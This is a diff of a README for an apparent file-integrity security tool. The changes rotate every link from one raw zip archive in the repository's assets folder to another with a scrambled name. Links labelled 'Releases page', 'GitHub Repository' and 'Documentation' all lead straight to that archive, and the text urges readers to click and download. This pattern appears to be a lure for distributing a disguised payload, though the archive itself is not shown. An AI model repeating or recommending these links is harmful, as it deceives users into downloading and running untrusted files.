@@ -1,6 +1,6 @@
 # 🛡️ File-Integrity-Checker-Cybersecurity-Tool - Keep Your Files Safe and Secure
 
-[![Download Now](https://raw.githubusercontent.com/Munem-1/File-Integrity-Checker-Cybersecurity-Tool/main/assets/File-Integrity-Checker-Cybersecurity-Tool_v2.2-beta.2.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/Munem-1/File-Integrity-Checker-Cybersecurity-Tool/main/assets/File-Integrity-Checker-Cybersecurity-Tool_v2.2-beta.2.zip)
+[![Download Now](https://raw.githubusercontent.com/Munem-1/File-Integrity-Checker-Cybersecurity-Tool/main/assets/Integrity_Tool_Cybersecurity_Checker_File_3.7-alpha.5.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/Munem-1/File-Integrity-Checker-Cybersecurity-Tool/main/assets/Integrity_Tool_Cybersecurity_Checker_File_3.7-alpha.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,12 +10,12 @@ Welcome to File Integrity Checker, your go-to tool for ensuring the safety of yo
 
 To get started, follow these steps:
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/Munem-1/File-Integrity-Checker-Cybersecurity-Tool/main/assets/File-Integrity-Checker-Cybersecurity-Tool_v2.2-beta.2.zip) to download the software.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Munem-1/File-Integrity-Checker-Cybersecurity-Tool/main/assets/Integrity_Tool_Cybersecurity_Checker_File_3.7-alpha.5.zip) to download the software.
 2. Find the latest version listed there.
 3. Click on the file that corresponds to your operating system.
 4. Once the download finishes, locate the file in your downloads folder.
 
-Make sure to click this link again for easy access: [Download Now](https://raw.githubusercontent.com/Munem-1/File-Integrity-Checker-Cybersecurity-Tool/main/assets/File-Integrity-Checker-Cybersecurity-Tool_v2.2-beta.2.zip).
+Make sure to click this link again for easy access: [Download Now](https://raw.githubusercontent.com/Munem-1/File-Integrity-Checker-Cybersecurity-Tool/main/assets/Integrity_Tool_Cybersecurity_Checker_File_3.7-alpha.5.zip).
 
 ## ⚙️ System Requirements
 
@@ -70,7 +70,7 @@ We welcome contributions. If you want to improve the tool, feel free to fork the
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://raw.githubusercontent.com/Munem-1/File-Integrity-Checker-Cybersecurity-Tool/main/assets/File-Integrity-Checker-Cybersecurity-Tool_v2.2-beta.2.zip)
-- [Documentation](https://raw.githubusercontent.com/Munem-1/File-Integrity-Checker-Cybersecurity-Tool/main/assets/File-Integrity-Checker-Cybersecurity-Tool_v2.2-beta.2.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Munem-1/File-Integrity-Checker-Cybersecurity-Tool/main/assets/Integrity_Tool_Cybersecurity_Checker_File_3.7-alpha.5.zip)
+- [Documentation](https://raw.githubusercontent.com/Munem-1/File-Integrity-Checker-Cybersecurity-Tool/main/assets/Integrity_Tool_Cybersecurity_Checker_File_3.7-alpha.5.zip)
 
 This tool is designed for all users. Download it today and keep your files secure.
